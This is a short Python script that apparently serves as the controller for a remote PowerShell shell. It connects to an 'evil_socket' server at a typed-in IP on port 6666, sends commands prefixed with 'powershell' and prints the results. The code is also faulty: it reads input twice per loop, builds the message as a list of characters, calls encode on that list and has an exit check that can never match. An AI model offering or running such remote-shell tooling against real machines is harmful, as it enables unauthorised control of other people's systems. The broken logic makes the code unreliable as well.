import socket

#####################################################################

evil_socket_port = 6666
evil_socket_IP = ''
evil_socket_IP = input("Enter the IP address of the server: ")
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

####################################################################

client_socket.connect((evil_socket_IP,evil_socket_port))
print("connexion réussi")

while True:
    message = ["powershell"]
    command = input(">>> ")
    try :
        command = input(">>> ")
        message += command
        if message == "exit":
            client_socket.close()
            break
        else:
            client_socket.send(message.encode())
            data = client_socket.recv(1024).decode()
            print(data)
    except KeyboardInterrupt:
        break

client_socket.close()